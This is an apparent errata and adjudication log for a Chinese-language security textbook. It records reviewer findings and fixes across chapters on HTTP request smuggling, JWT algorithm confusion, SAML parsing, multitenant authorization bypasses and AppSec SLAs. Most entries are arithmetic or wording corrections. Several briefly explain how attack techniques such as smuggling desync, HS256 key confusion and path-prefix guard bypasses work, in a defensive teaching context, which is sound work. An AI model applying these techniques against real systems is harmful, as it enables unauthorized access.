claim: 沒有 `F1` 時，`F2` 必須盲猜兩千四百萬位址空間中的目標；淨超額資金損失 = 200,000 - 10,000 = 190,000 分 ($1,900.00，達初始餘額 20 倍)；在 < 1 ms 視窗內打破餘額 <= 10,000 分不變量。
book value: Stated `10.0.0.0/8` has 24 million addresses (actual: `2^24 = 16,777,216` ≈ 1,678 萬), labeled `190,000` as 20x of `10,000` (actual: `200,000` is 20x, `190,000` excess is 19x), and wrote `餘額 <= 10,000 分` instead of `累計出金 <= 初始可用餘額 10,000 分`.  verifier value: `10.0.0.0/8` is `16,777,216` addresses; total payout `200,000` is 20x initial balance while net excess `190,000` is 19x; invariant broken is cumulative payout `<= 10,000` cents under `< 1 ms` arrival jitter.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Pure arithmetic: `190,000 / 10,000 = 19` (while `200,000 / 10,000 = 20`), and `2^24 = 16,777,216` (1,678 萬, not 2,400 萬).
tiebreak: n/a
action: Fixed `20x` vs `19x` wording in the Worked Example, corrected `10.0.0.0/8` prose to `16,777,216` (約 1,678 萬), and updated F3 invariant notation to `累計出金 <= 10,000 分`.

## [2026-11-21] ch32-chaining-ai-and-0day-workflow.md — fixed
claim: CodeQL / Semgrep / AST 抽取所有 Source-to-Sink 路徑；防守方只要用最低成本切斷依賴圖上最關鍵的一條邊，整條 Critical 攻擊鏈就會瞬間坍塌成無害的孤立雜訊；在進入 `libnexus-parse` 配置前先確認 `len <= 65_536` 且改用飽和／檢查加法。
book value: Claimed static tools extract all paths, cutting one edge turns remaining nodes into harmless noise, and equated saturating addition with checked addition.  verifier value: Static queries extract candidate flows within modeled scope; cutting a required edge blocks paths depending on that edge while residual defects still require remediation; enforce `len <= 65,536` and `checked_add(8)` (max valid total `65,544 bytes`) plus buffer length verification.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Saturating addition clamps to `u32::MAX` instead of rejecting overflow, whereas `checked_add(8)` after `len <= 65_536` bounds total size to `65,544 bytes`.
tiebreak: n/a
action: Scoped static extraction in the pipeline diagram, refined chain-cutting defense claims, and specified `len <= 65_536` + `checked_add(8)` (`65,544 bytes` max) + buffer bounds verification.

## [2026-11-21] ch32-chaining-ai-and-0day-workflow.md — fixed
claim: 本實驗要求你在純本地離線隔離環境中完成流程，並以 `git clone --depth 300 <REPO_URL>` 與 `semgrep scan --config auto` 作為操作步驟；用 `rg` 在完整倉庫搜尋該 `target_fn` 的所有上游呼叫端；已固定限制 `payload_len <= 65_536` 且型別為 `usize`（64 位元下不可能溢位）。
book value: Paired offline environment requirement with live remote URLs/`--config auto`, claimed text search (`rg`) finds all callers, and claimed `payload_len <= 65_536` alone prevents `offset + payload_len` overflow for 64-bit `usize`.  verifier value: Separate online preparation/cloning from offline testing with local rules (`--config ./local-rules.yaml`); combine `rg` with LSP symbol resolution/manual inspection for indirect calls; bound both `offset` and `payload_len` (and verify `offset + payload_len <= buf.len()`) to rule out `usize` overflow.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — In 64-bit Rust, `offset + payload_len` can still overflow if `offset` is near `usize::MAX` unless `offset` is also bounded or `checked_add` is used.
tiebreak: n/a
action: Clarified preparation vs offline execution in the lab, replaced `--config auto` with local rule config, added LSP/call-graph verification alongside `rg`, bounded both `offset <= 1_048_576` and `payload_len <= 65_536` in the sample audit note, and refined Self-Check #1, #3, #4 answers.

## [2026-11-21] ch34-appsec-engineering-and-sdlc.md — fixed
claim: Worked Example ROI 與 Self-Check #2：高訊號規則每日觸發檢查的假警報率控制在 2%（以同等 100 次規則觸發基數或對應 100 PRs/天估算）；80 小時 ÷ 7.0 小時/天 ≈ 11.43 個工作天；立即將誤報率 `30%` 的通用啟發式規則從「PR 阻斷」降級為「非同步背景掃描」，停止每日消耗團隊 `7.5` 小時分診假警報。
book value: Mixed alert count and PR count denominators, omitted net break-even after amortizing the 4 hr/month maintenance cost, and implied moving alerts to async scanning makes the 7.5 hours of triage disappear without filtering.  verifier value: Pin Scenario B denominator to 100 alerts/day at 2% false-positive rate for PR-stage comparison, report both gross break-even (`11.43` days) and net break-even after `0.2 hr/day` maintenance (`80 / 6.8 ≈ 11.76` workdays), and note that async background scanning must prune/filter noisy rules rather than shifting 7.5 hr/day unchanged to AppSec.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — `80 / (7.0 - 4/20) = 80 / 6.8 = 11.76` workdays, and shifting unfiltered alerts from PR to background only changes who triages them unless noisy rules are disabled/filtered.
tiebreak: n/a
action: Clarified the 100-alert baseline denominator in Scenario B, added both gross (`11.43` days) and net (`11.76` days) break-even figures, and updated Self-Check #2 to specify pruning/filtering noisy rules in async mode.

## [2026-11-21] ch34-appsec-engineering-and-sdlc.md — fixed
claim: 可達性分析與 SLA 決策（正文、SLA 表與自我檢核第 3 題）：唯有「生產環境可達」且「具備實戰利用機率（EPSS `≥ 0.1` 或列入 KEV）」才觸發 24 小時或 7 天 SLA；漏洞 A（`CVSS 9.1`, `EPSS 0.42`, `devDependencies`）直接排入常規維護；漏洞 B（`CVSS 7.8`, `EPSS 0.18`）啟動 7 天或 24 小時 SLA。
book value: Made production reachability a prerequisite before triggering immediate triage on `EPSS >= 0.1` / KEV, creating a literal conflict with the base-numbers table and the chapter's own SLA table on Vulnerability A.  verifier value: Per `_meta/running-examples.md`, `EPSS >= 0.1` or CISA KEV triggers immediate action/triage (`立即處置`); during immediate triage, verify production and build/CI exposure—if confirmed unreachable in production image and unexposed in CI/build, document the non-reachability exception to downgrade to routine maintenance; for Vulnerability B (`CVSS 7.8`, `EPSS 0.18`, reachable), trigger immediate action with a `7 天` High SLA (or `24 小時` only if confirmed to meet Critical criteria).  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Reconciling `EPSS >= 0.1` immediate triage with reachability verification and documented non-exposure downgrade makes the chapter 100% consistent with `_meta/running-examples.md`.
tiebreak: n/a
action: Updated the SCA reachability section, the SLA governance table, and Self-Check #3 answer so `EPSS >= 0.1` / KEV always triggers immediate triage first, followed by reachability/build-exposure verification and either `24 小時` (Critical), `7 天` (High), or documented non-exposure exception downgrade.

## [2026-11-21] ch34-appsec-engineering-and-sdlc.md — fixed
claim: 動手做參考解答：`safeFetch(rawUrl, options)` 與 `safeHttpGet(rawUrl)` 命名與埠號檢查不一致、IPv6 正規化不完整；`TenantDbClient` 使用兩次獨立 `this.pool.query` 呼叫 `set_config(..., true)` 與查詢，在自動提交與連線池下無法保證同一交易與同一連線；Semgrep 規則未涵蓋匯入語句。
book value: `safeHttpGet` lacked `80`/`443` port enforcement and hex IPv4-mapped IPv6 handling; `TenantDbClient` ran `set_config(..., true)` outside an explicit `BEGIN...COMMIT` transaction on a checked-out client; `.semgrep/paved-road.yaml` only matched calls.  verifier value: Implement `safeFetch(rawUrl, options)` (with `safeHttpGet` alias), enforce standard ports `80`/`443`, normalize IPv6 (including hex `::ffff:0:0/96`), check out a single client via `pool.connect()` and wrap `set_config(..., true)` + query in `BEGIN ... COMMIT` / `ROLLBACK`, and add import patterns to `.semgrep/paved-road.yaml`.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — In PostgreSQL, `set_config(setting, value, true)` (`is_local = true`) takes effect only for the current transaction; calling `pool.query` twice in autocommit mode loses the setting immediately and may even hit two different connections.
tiebreak: n/a
action: Rewrote `safe-http.ts`, `tenant-db.ts`, `.semgrep/paved-road.yaml`, and the `tsx` test assertions to enforce ports `80`/`443`, normalize IPv6 addresses, execute `BEGIN` + `set_config` + query + `COMMIT` on a single checked-out client, and test the exact SQL transaction sequence.

## [2026-11-21] ch36-security-career-and-interviews.md — fixed
claim: Worked Example（45 分鐘 NexusPay 白板面試）與任務二解答：導入 Paved Road 資料庫封裝層強制注入 `req.auth.tenant_id` 即可消滅 BOLA；非同步巡檢「總儲值 - 總提領 != 當前餘額」；解析器子行程收到 `SIGSEGV` 或單次配置失敗（`len > 65,536`）保留崩潰樣本；監控 Worker 對私網 DNS/TCP 連線嘗試任何一次觸發即視為高確定性入侵指標；攻擊鏈 3 缺少 CSV/報表公式注入之輸出層防禦。
book value: Equated tenant scoping alone with full BOLA prevention (ignoring intra-tenant object authorization), omitted initial balance (`10,000` cents) from the ledger reconciliation equation, conflated pre-allocation length rejection (`len > 65,536`) with allocator failure/crash, and omitted CSV formula neutralization in Task 2's defense section.  verifier value: Combine tenant scoping with object-level authorization checks; reconcile `期初餘額 + 已入帳淨變動 (總儲值 - 總提領) == 當前餘額`; monitor oversized-input rejections, allocation failures, and crash signals separately; treat private-IP connection attempts as high-priority investigation signals; add CSV formula prefix neutralization (`=`, `+`, `-`, `@`).  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — Since NexusPay test accounts start with an initial balance of `10,000` cents, `總儲值 - 總提領 != 當前餘額` would false-alarm before any transaction unless initial balance (`期初餘額`) is included.
tiebreak: n/a
action: Updated the 45-minute Whiteboard Worked Example and Task 2 reference solution to include object-level authorization alongside `tenant_id`, include `期初餘額` in ledger reconciliation, separate length-rejection metrics from crash sample collection, and include CSV formula neutralization.

## [2026-11-21] ch36-security-career-and-interviews.md — fixed
claim: 動手做預估時間為 60 分鐘，任務一標為 20 分鐘，任務二標為「45 分鐘 NexusPay 白板 Threat Modeling 計時模擬（40 分鐘）」；自我檢核第 4 題將已指定為可跨租戶利用的 P0（24 小時 SLA）允許以 Risk Acceptance 壓定 7 天內根治期限。
book value: Header total `60 分鐘` and Task 2 header `(40 分鐘)` conflicted with the 45-minute timer (`5 + 15 + 15 + 10 = 45` min, total `20 + 45 = 65` min); Self-Check #4 allowed deferring an active cross-tenant P0 to a 7-day SLA.  verifier value: Set Task 2 to `45 分鐘` and total lab time to `65 分鐘`; in Self-Check #4, enforce the `24 小時` Critical SLA for P0 cross-tenant vulnerabilities (requiring immediate mitigation/isolation within 24 hours rather than deferring an unmitigated P0 for 7 days).  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — `5 + 15 + 15 + 10 = 45` minutes plus Task 1's `20` minutes equals `65` minutes; and per `_meta/running-examples.md`, Critical (P0) vulnerabilities have a mandatory `24 小時` SLA.
tiebreak: n/a
action: Fixed Task 2 duration to `45 分鐘` and total lab duration to `65 分鐘`, updated Self-Check #4 answer to uphold the `24 小時` Critical SLA, and marked resume/interview metrics and career weight tables as illustrative models.

## [2026-11-21] ch37-certifications-and-proof-of-work.md — fixed
claim: 軸線一標題「24–72 小時實戰上機考 vs. 選擇題背誦考」與表內 BSCP（4 小時）、CKS（2 小時）、CPTS（10 天 = 240 小時）時長不符；第 1 層與開頭對 GHSA/NVD 編號與 Proof of Work 的描述過度絕對；Worked Example 中 Portfolio C「單位訊號成本：極低（僅為 Portfolio A 的 6.8%，Portfolio B 的 34.2%），技術說服力最高」。
book value: Heading said `24–72 小時` while table listed `2h` to `10d`; `598 / 8,700 = 6.8736%` was truncated to `6.8%` instead of rounded to `6.9%` and labeled "單位訊號成本" when it is the cash cost ratio (and C tied with D at `9.5/10` on tech confidence).  verifier value: Change heading to `限時實戰上機考（2 小時至 10 天）vs. 選擇題與混合題型考`; clarify that GHSA/CVE numbers and PoW links must be verified for discoverer credit, root cause, and patch merger; report `598 / 8,700 ≈ 6.9%` as cash cost ratio and note C ties with D at `9.5/10` in the illustrative tech-product score.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — `598 / 8700 = 0.0687356...` which rounds to `6.9%`, and `598 / 1749 = 0.3419...` (`34.2%`), both of which are pure cash cost ratios.
tiebreak: n/a
action: Updated Axis 1 heading to `2 小時至 10 天`, added credit/root-cause/patch verification requirements to PoW Pyramid Layer 1–3, corrected `6.8%` to `6.9%` (`現金成本比較`), and noted C and D tie at `9.5/10` for tech-product technical confidence.

## [2026-11-21] ch37-certifications-and-proof-of-work.md — fixed
claim: 動手做與自我檢核：參考人物自費預算上限 `$800` USD，已花 `$598` USD 後建議評估補考 AWS Security Specialty（`$300` USD，合計 `$898` USD 超支 `$98` USD）；自我檢核第 3 題稱「傳入 10 MB 空字串」；自我檢核第 4 題稱補 OSCP（`$1,749` USD）或 CISSP（`$749` USD）即可同時打通 HR 濾網與技術關卡且為最低成本。
book value: Unexplained `$98` budget overrun (`$598 + $300 = $898 > $800`), self-contradictory `"10 MB 空字串"` (empty string has 0 length), and over-absolute claim that buying OSCP/CISSP guarantees passing technical rounds at minimum cost.  verifier value: State explicitly that adding the `$300` exam beyond the `$800` cap (`$202` remaining) requires `$98` additional budget, employer sponsorship, or existing Burp license savings; change `"10 MB 空字串"` to `"10 MB 空白字元（whitespace）"`; note OSCP exam-only option (`~$1,699`) and CISSP annual maintenance (`$135/yr`) and distinguish HR eligibility screening from technical evaluation.  flagging families: codex:gpt-6.2-sol:low
arbiter: agrees=true conf=high — `$598 + $300 = $898` exceeds `$800` by `$98`, and an empty string cannot be 10 MB.
tiebreak: n/a
action: Added explicit `$98` budget arithmetic in the 6-month blueprint, replaced `"10 MB 空字串"` with `"10 MB 空白字元（whitespace）"` and bounded the Self-DoS threat model in Self-Check #3, and refined Self-Check #4 to include exam-only/maintenance cost details and separate HR screening from technical evaluation.


## Round 2（`codex gpt-6.2-sol medium` 全 37 章 + `ch27` `argon-low` fallback）


<!-- source: verify-log-r2-slice-1.md -->
# P4 Round-2 跨模型審查裁決與外科修補日誌（Slice 1: Ch01–Ch05）

- **審查面板**：`codex:gpt-6.2-sol:medium`（Round-2 快取：`books/vuln-hunting/book-src/_meta/review-sol62-medium-cache/`）
- **負責範圍**：`ch01-trust-boundaries.md`、`ch02-recon-and-audit-workflow.md`、`ch03-http-smuggling.md`、`ch04-authentication-and-sessions.md`、`ch05-enterprise-sso-and-mfa.md`
- **基準核對**：全數對齊 `_meta/running-examples.md` 全書基準數字表，零變更基準常數。

---

## 1. `ch01-trust-boundaries.md`

### `verdict == "incorrect"` 裁決與修補（6 項全數修正）

1. **ACID 交易保證範圍與已宣告約束的表述**
   - **審查意見**：原句將整體 ACID 交易保證等同於已宣告約束；即使某欄未設 `CHECK`，交易寫入仍受原子性與隔離級別規範。
   - **裁決與修補**：成立。修訂第 16 行，明確區分「納入資料庫交易管理的資料操作（受原子性與隔離性保護）」與「特定業務一致性僅涵蓋已由交易邏輯或宣告約束強制檢查的資料表狀態」，以及未納入同一交易的外部副作用。
2. **資料庫授權預設假設的表述**
   - **審查意見**：資料庫本身可依自身角色、權限與 PostgreSQL RLS 執行授權判斷，問題在於應用層共用連線池角色時未將終端商戶身分與租戶脈絡綁定至資料庫操作。
   - **裁決與修補**：成立。修訂第 16 行，精確表述為「當應用層以共用連線池角色存取資料庫且未啟用並綁定列級安全（RLS）脈絡時，資料庫本身無法區分不同終端商戶的應用層授權」。
3. **跨信任邊界接收端重新解析與單一權威解析原則之協調**
   - **審查意見**：若接收端收到的是已具完整性保護且來源可驗證的結構化表示，可直接依該表示檢查本層授權與業務約束，無須對原始字串重複解析（避免製造新的解析器分歧）。
   - **裁決與修補**：成立。修訂第 55 行，明確區分「未經驗證的原始輸入須在邊界入口完成權威解析」與「已具完整性保護的結構化表示仍須強制檢查本層的授權與業務約束」。
4. **FFI 記憶體安全不變量 `Inv_4` 的無溢位邊界不等式**
   - **審查意見**：僅寫 `0 <= offset + write_len <= alloc_size` 無法排除負偏移或固定寬度整數溢位折返。
   - **裁決與修補**：成立。修訂第 154 行 `Inv_4` 為「FFI 目的緩衝區須有效、存活且可寫，並在無溢位算術下滿足 `0 <= offset <= alloc_size` 且 `0 <= write_len <= alloc_size - offset`」。
5. **攻擊樹根目標可達性與「整體安全性等於零」修辭**
   - **審查意見**：狀態機模型未將整體安全性定義為純量數值 0，應表述為提領安全不變量仍可被擊穿、攻擊樹根目標仍處於可達狀態。
   - **裁決與修補**：成立。修訂第 213 行表述為「該提領安全不變量依然會被輕易擊穿，攻擊樹的根目標仍處於可達狀態」。
6. **Nginx `30 s` 與 Node.js `5 s` 逾時參數與請求切分分歧的因果區分**
   - **審查意見**：`proxy_read_timeout = 30 s` 與 `keepAliveTimeout = 5 s` 分別對應不同計時事件，請求定界分歧源於 HTTP 標頭解析差異與持久連線複用。
   - **裁決與修補**：成立。修訂第 264 行跨層防禦表與第 429 行威脅矩陣，將定界標頭嚴格校驗與上游 Keep-Alive／逾時生命週期協調分開精確表述。

### 關鍵 `imprecise` 補強

- **功能缺陷與安全漏洞的狀態空間區分**（第 42 行）：補充「在所有可行執行軌跡上的每個狀態均維持於安全狀態子集 `I` 內」與功能規格偏離之對照。
- **Worked Example 狀態轉移表快照語意**（第 163 行）：註明 `t_2..t_4` 為各筆出金與扣款皆完成後之狀態快照。
- **路徑正規化與符號連結 TOCTOU**（第 229、481 行）：區分字面路徑檢查與檔案系統 TOCTOU，並將 `path.relative` 包含關係檢查精確化為完整路徑元件比對（`rel !== '..' && !rel.startsWith('..' + path.sep) && !path.isAbsolute(rel)`）與 `O_NOFOLLOW` 防護。
- 其餘針對閉卷審查環境未附外部書籍／PortSwigger 目錄全文之 `imprecise` 標記（已由 `_meta/landscape-2026-11.md` 驗證），予以維持。

---

## 2. `ch02-recon-and-audit-workflow.md`

### `verdict == "incorrect"` 裁決與修補（8 項全數修正）

1. **Node.js 與 `curl` 的 CA 信任來源表述**
   - **審查意見**：應按官方預設建置（內建 Mozilla CA 束、未開啟系統 CA 旗標）與 `curl` 的 TLS 後端條件精確描述，並在自我檢核第 1 題明示 CLI 已配置代理 Dispatcher 轉發流量。
   - **裁決與修補**：成立。修訂第 44 行與第 353 行自我檢核題幹，明確交代預設建置條件與代理轉發配置前提。
2. **Certificate Pinning 與雙向 mTLS 的失敗邊界區分**
   - **審查意見**：Pinning 是下游會話 A 客戶端拒收代理葉憑證；mTLS 是上游會話 B 伺服器要求代理出示客戶端憑證並以對應私鑰完成持有證明（私鑰本身不傳送給對端）。
   - **裁決與修補**：成立。修訂第 198 行，將下游會話 A 的 Certificate Pinning 與上游會話 B 的 mTLS 客戶端憑證持有證明分別精確說明。
3. **Soft-404 導致「100% 誤報」的比例表述**
   - **審查意見**：命中清單中的誤報率為 `F / (T + F)`，僅在 `T = 0` 時為 100%；實際現象是將字典中所有未知路徑全數誤判為命中。
   - **裁決與修補**：成立。修訂第 73 行，改為「把字典裡所有未知路徑全數誤判為有效命中，產出海量誤報並淹沒真正的端點」。
4. **Soft-404 基線向量的動態標頭剝除與交叉驗證**
   - **審查意見**：`X-Request-Id` 每次請求皆變動，不能直接以原始值要求相等；且符合基線的回應應標為疑似軟 404 並搭配方法與 `Accept` 切換交叉確認。
   - **裁決與修補**：成立。修訂第 75 行，明確寫出實測主體長度、剝除動態 `X-Request-Id`／nonce 後之結構特徵，以及搭配 HTTP 方法與 `Accept` 標頭切換交叉確認。
5. **步驟二 Soft-404 腳本與內文的方法／標頭一致性**
   - **審查意見**：內文提及測試 `OPTIONS` 與 `POST`，但腳本迴圈僅有 `GET` 與 `POST`，且基線請求未帶與候選請求相同的 `Content-Type` 標頭。
   - **裁決與修補**：成立。修訂第 273–293 行，在基線迴圈補齊一致的 `-H "Content-Type: application/json"`，並將候選探測方法迴圈擴充為 `GET POST OPTIONS`，與內文完全一致。
6. **`legacy-export` 的 APS 評分級距映射**
   - **審查意見**：`Complexity=3` 時得分 `81..108` 皆 `≥ 72`，兩者均屬 **P0**；僅在 `Complexity=2` 時得分 `54..72` 才分別落入 **P1** 至 **P0**。
   - **裁決與修補**：成立。修訂第 342 行，將 `81..108`（均為 **P0**）與 `54..72`（**P1** 至 **P0**）分開明確標示，並對齊 2.4 節 `Sink_Impact` 定義。
7. **`routes-health` 的跨越信任邊界數計算**
   - **審查意見**：依 2.4 節定義，客戶端進入 Nginx 計第 1 道邊界，Nginx 轉發至 NestJS Controller 計第 2 道邊界，故 `Boundary_Crossings = 2`，得分應為 `4 × 2 × 1 × 1 = 8`。
   - **裁決與修補**：成立。修訂第 342 行，將 `routes-health` 的 `Boundary` 由 `1` 修正為 `2`，總分修正為 `8`。
8. **低頻冷路徑「放大為 100% 確定性突破口」的表述與延伸閱讀 RFC 節號**
   - **審查意見**：APS 為優先序分數而非 100% 成功率；此外 `CONNECT` 位於 RFC 9110 §9.3.6，而 HTTP/1.1 連線持久性位於 RFC 9112 第 9 節（§9.3）而非第 6 節，ALPN 則定義於 RFC 7301。
   - **裁決與修補**：成立。修訂第 376 行冷路徑風險表述，並修正第 382–383 行 RFC 9110 §9.3.6、RFC 9112 第 6 節與第 9 節（§9.3），以及補入 RFC 7301（TLS ALPN）。

---

## 3. `ch03-http-smuggling.md`

### `verdict == "incorrect"` 裁決與修補（3 項全數修正）

1. **TCP 位元組流「永久錯位」的表述**
   - **審查意見**：解析分歧造成的是該持久連線上前後端對後續位元組訊息歸屬失步；一旦後續位元組被消費完畢或因語法錯誤關閉連線，該連線即終止或改變狀態，並非永久錯位。
   - **裁決與修補**：成立。修訂第 13 行，改為「導致該條持久 TCP 連線上前後端對後續位元組的訊息歸屬失去同步，將攻擊者構造的請求前綴嫁接到同一連線上緊隨其後的無辜使用者請求上（直到該連線因解析錯誤關閉或完成後續位元組消費為止）」。
2. **chunked 格式「區塊資料後方必須跟著 `\r\n0\r\n\r\n`」的通用性表述**
   - **審查意見**：chunked 訊息可包含多個非零資料區塊及可選尾端欄位；只有在單一資料區塊且無尾端欄位時，該資料區塊後方才會直接緊接 `\r\n0\r\n\r\n`。
   - **裁決與修補**：成立。修訂第 113 行，明確限定為「在單一資料區塊且無尾端欄位的 chunked 訊息中，區塊資料後方必須跟著該區塊結尾 `\r\n` 與終止區塊 `0\r\n\r\n`（共 `\r\n0\r\n\r\n`）」。
3. **HTTP/2 malformed 請求的錯誤處置層級（串流級 vs 連線級）**
   - **審查意見**：HTTP/2 為多工連線，RFC 9113 將欄位或 `content-length` 違規定義為串流級錯誤（以該串流的 `PROTOCOL_ERROR` 或 `400` 拒絕），無須關閉承載其他合法串流的整條 HTTP/2 連線；HTTP/1.1 則回 `400 Bad Request` 並關閉該 H1.1 連線。
   - **裁決與修補**：成立。修訂第 275 行縱深防禦表，將 HTTP/1.1（回 `400` 並關閉連線）與 HTTP/2（以該串流的 `PROTOCOL_ERROR` 或 `400` 拒絕且絕不降級轉發）分協定精確列明。

### 關鍵 `imprecise` 補強

- **自我檢核第 3 題 (a) 的 `DATA` frame 長度語意**（第 520 行）：明確註明為「無填補（unpadded）`DATA` frame 實際資料總長為 `30` bytes」，排除 Padding 位元組造成的歧義。

---

## 4. `ch04-authentication-and-sessions.md`

### `verdict == "incorrect"` 裁決與修補（3 項全數修正）

1. **演算法混淆根因小結語意反轉**
   - **審查意見**：原句「把用於驗簽的公鑰資料與演算法信任策略綁在一起」在字面上描述的是正確防禦（綁定金鑰與演算法策略），漏寫了「容許未經驗證的 Token Header 動態指定不相容的 `HS256` 並把公鑰當成對稱密鑰代入」這個漏洞前提。
   - **裁決與修補**：成立。修訂第 128 行，精確寫出「只要驗證端未將金鑰型別與允許的演算法白名單鎖死在伺服器端設定，反而容許未經驗證的 Token Header 動態指定 `HS256` 並把公開的 RSA 公鑰位元組當成對稱密鑰代入……」。
2. **PEM 金鑰檔尾換行（`451` vs `450` bytes）與 `LF` vs `CRLF`（`451` vs `460` bytes）的位元組差值**
   - **審查意見**：`451` 與 `450` bytes 的 1-byte 差異來自「檔尾是否保留最後一個 `\n`」；若整份 9 行 PEM 由 `LF` 改為 `CRLF`，9 處換行會多出 9 bytes（`451 + 9 = 460` bytes）。原句將兩者混寫於同一括號。
   - **裁決與修補**：成立。修訂第 74 行，將「檔尾是否保留換行字元 `\n`（`451` vs `450` bytes）」與「行尾換行採用 `LF` 還是 `CRLF`（9 處換行共差 9 bytes，即 `451` vs `460` bytes）」分開精確列出。
3. **Refresh Token 輪換在資料庫交易中的併發行為與家族撤銷提交（Commit before 401）**
   - **審查意見**：在 `SERIALIZABLE` 隔離下，併發更新同一列會對敗方拋出序列化失敗而非回傳 0 列讀取 `used = true`；而在 `READ COMMITTED` 的原子條件更新下，列鎖會讓敗方等待首筆提交後重評 `WHERE used = false` 並取得 0 列。此外，觸發家族撤銷（`SET revoked = true WHERE family_id = $1`）後必須先 `COMMIT` 提交交易，才能回傳 `401`，否則例外回滾會使撤銷失效。
   - **裁決與修補**：成立。修訂第 236 行與第 276–284 行參考解答，明確採用 `READ COMMITTED` 列鎖保護之原子條件更新，並強調家族撤銷 `UPDATE` 必須先行 `COMMIT` 提交後再回傳 `401`。

### 關鍵 `imprecise` 補強

- **`exp` 與 `iat` 型別與正時間差檢查**（第 218–226 行）：在程式碼範例中明確檢查 `typeof payload.exp === 'number'`、`typeof payload.iat === 'number'`、`payload.exp > payload.iat` 且 `payload.exp - payload.iat <= 900`。
- **RSA 公鑰取得來源描述**（第 74 行）：將「OIDC Discovery 端點」精確化為「OIDC Discovery 端點指向的 JWKS 位址或公開金鑰端點」。

---

## 5. `ch05-enterprise-sso-and-mfa.md`

### `verdict == "incorrect"` 裁決與修補（2 項算術與索引全數修正）

1. **Worked Example 中 Exclusive C14N 單行 `<saml:Assertion>` 的位元組長度計算**
   - **審查意見**：起始標籤 `<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assert_legit_01" IssueInstant="2026-11-21T02:00:00Z" Version="2.0">` 實測為 `139` bytes（原寫 `140`），加上 `<saml:Issuer>`（`51` bytes）、`<saml:Subject>` 子樹（`78` bytes）與 `</saml:Assertion>`（`17` bytes），總長為 `139 + 51 + 78 + 17 = 285` bytes（原寫 `286` bytes）。
   - **裁決與修補**：成立。逐字元核對 ASCII 長度確為 `139 + 51 + 78 + 17 = 285` bytes，修訂第 128 行與第 130 行。
2. **Worked Example 中 DOM 前序走訪（Pre-order DFS）的元素索引**
   - **審查意見**：從 `<samlp:Response>`（元素 0）起算，合法 `<saml:Assertion ID="_assert_legit_01">` 為元素 6，`<saml:Issuer>` 為元素 7，`<ds:Signature>` 子樹共 11 個元素（元素 8..18），其後的 `<saml:Subject>` 為元素 19，第二個 `<saml:NameID>` 為元素 20（`NodeList[1]`），原寫「元素 17」漏計了 `<ds:Transforms>` 下的子元素數。
   - **裁決與修補**：成立。修訂第 143–145 行，明確標出元素 7..18 之分佈，並將 `<saml:Subject>` 與第二個 `<saml:NameID>` 修正為元素 19 與元素 20（`NodeList[1]`）。

### 關鍵 `imprecise` 補強

- **NexusPay SAML SP Entity ID 與 `expectedAudience` 設定說明**（第 259 行）：於程式碼註解標明 NexusPay 將 SP Entity ID 與 ACS URL 設為同一 URI，分別核對 `Audience` 與 `Destination`/`Recipient`。
- **WebAuthn 獨立挑戰流程鍵與 MFA Redis Lua 原子消費**（第 292–293 行）：將 Redis 挑戰鍵改為 `webauthn:chal:<challengeId>` 並綁定 `{ challenge, userId, sessionId, operation }` 避免同會話並行覆寫；將 MFA 驗證額度遞增與挑戰／備援碼單次消費整合為 Redis Lua 單一原子步驟。

---

## 6. 工具鏈驗證結果

- `python3 tools/md-reader/lint_book.py books/vuln-hunting/book-src --lang zh-TW --config books/vuln-hunting/book-src/_meta/lint.config.json`：Ch01–Ch05 **0 errors, 0 warnings**。
- `python3 tools/md-reader/check_diagrams.py books/vuln-hunting/book-src`：Ch01–Ch05 **0 errors, 0 warnings**。


<!-- source: verify-log-r2-slice-2.md -->
# P4 Round-2 Adjudication & Surgical-Fix Log — `slice-2` (Ch06–Ch10)

- **Reviewer Panel**: `codex:gpt-6.2-sol:medium` (`_meta/review-sol62-medium-cache/ch06..ch10.json`)
- **Adjudicator**: `p4-r2-2` (`gemini-4-argon-medium`)
- **Scope**:
  - `ch06-authorization-and-multitenancy.md`
  - `ch07-graphql-grpc-websocket.md`
  - `ch08-injection-families.md`
  - `ch09-file-parsers-and-xxe.md`
  - `ch10-browser-and-client-attacks.md`

---

## 1. `ch06-authorization-and-multitenancy.md`

| Finding / Claim | Reviewer Verdict | Adjudication Decision | Surgical Action Taken |
|---|---|---|---|
| `### 1. 授權三元組與失效分類（API1 / API3 / API5）` vs 4-tuple formula `Policy(Subject, Action, Object, Context)` | `incorrect` | **Accepted (Genuine Defect)** | Updated H3 heading to `### 1. 授權四元組與失效分類（API1 / API3 / API5）` to match the 4-tuple definition. |
| `ValidationPipe` without `whitelist: true` (or DTO properties lacking `class-validator` decorators) retains extra fields | `incorrect` | **Accepted (Genuine Defect)** | Fixed condition logic: extra properties are retained when no runtime allowlist is active (e.g., `ValidationPipe` lacks `whitelist: true` and no explicit field mapping is used). Clarified that when `whitelist: true` IS enabled, undecorated properties are stripped (or rejected under `forbidNonWhitelisted: true`). |
| `req.path.startsWith('/v1/admin')` bypassed by case, trailing slash, or path normalization | `incorrect` | **Accepted (Genuine Defect)** | Removed the erroneous claim that appending a trailing slash defeats `startsWith('/v1/admin')`; clarified that bypasses stem from case-sensitivity mismatch (`/v1/Admin`), pre-routing path normalization (`/v1/public/../admin`), or trailing-slash prefix mismatch (`startsWith('/v1/admin/')` missing `/v1/admin`). |
| 80 endpoints across 12 Controllers "必定出現" missing Guard | `incorrect` | **Accepted (Overstatement Fix)** | Softened deterministic wording to `極易在新增或重構端點時出現忘記加 Guard 的預設放行空窗`. |
| Service layer "複合主鍵強制查詢" `(tenantId, accountId)` | `incorrect` | **Accepted (Terminology Precision)** | Updated to `租戶與資源複合條件強制查詢` (with optional composite PK / unique index at the table layer). |
| BFLA scan check phrased as "檢查是否未回傳 `403`" | `incorrect` | **Accepted (Precision Fix)** | Clarified that BFLA detection checks whether the restricted operation is not rejected (expected `403 Forbidden` without state change vs vulnerable `200 OK` with feeRate mutation). |
